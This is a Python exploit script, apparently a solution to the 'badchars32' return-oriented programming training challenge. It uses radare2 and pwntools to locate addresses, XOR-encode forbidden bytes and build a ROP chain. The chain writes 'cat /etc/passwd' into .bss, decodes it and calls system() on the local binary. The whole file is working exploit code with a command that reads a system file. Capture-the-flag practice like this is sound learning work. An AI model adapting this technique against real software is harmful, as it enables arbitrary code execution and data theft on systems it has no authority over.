import r2pipe
from pwn import *
import gadgets

binary = './badchars32'
padding = 44

def hex2int(s):
    return int(s[2:], 16)

r2 = r2pipe.open(binary)
r2.cmd('aaaa')

sections = r2.cmdj('iSj')
bss_addr = None
for sec in sections:
    if sec['name'] == '.bss':
        bss_addr = sec['vaddr']

print(bss_addr)

system_addr = hex2int(r2.cmd('is~system').strip().split()[2])
fgets_addr = hex2int(r2.cmd('is~fgets').strip().split()[2])

# put content here (define payload)

badchars = b'bic/ fns'

need_to_write = b'cat /etc/passwd\x00'
xor_key_b = 0x44

new_str = []
idx = []
for i, ch in enumerate(need_to_write):
    if ch in badchars:
        new_str.append(ch ^ 0x44)
        idx.append(i)
    else:
        new_str.append(ch)
print(new_str)

ns = []
while new_str:
    batch, new_str = new_str[:4], new_str[4:]
    ns.append(u32(bytes(batch).ljust(4, b'\x00')))
print([hex(n) for n in ns])


xor_ptr_ebx_cl = 0x08048890
def xor(addr):
    b = b''
    b += gadgets.pop_ebx(addr)
    b += p32(xor_ptr_ebx_cl)
    return b

payload = b''

for i, n in enumerate(ns):
    payload += gadgets.pop_esi_edi(n, bss_addr + 4 * i)
    payload += gadgets.mov_ptr_edi_esi()

payload += gadgets.pop_ecx(0x44)
for i in idx:
    payload += xor(bss_addr + i)

payload += p32(system_addr)
payload += p32(gadgets.pop_ebp_addr)
payload += p32(bss_addr)


for ch in badchars:
    if ch in payload:
        print('oh no')
        print(ch, repr(payload))
        exit(0)

with open('payload.bin', 'wb') as f:
    f.write(b'a' * padding + payload)

log.hexdump(payload)
# end of content
p = process(binary)
p.sendline(b'x' * padding + payload)
p.wait()
print(p.recvall().decode())
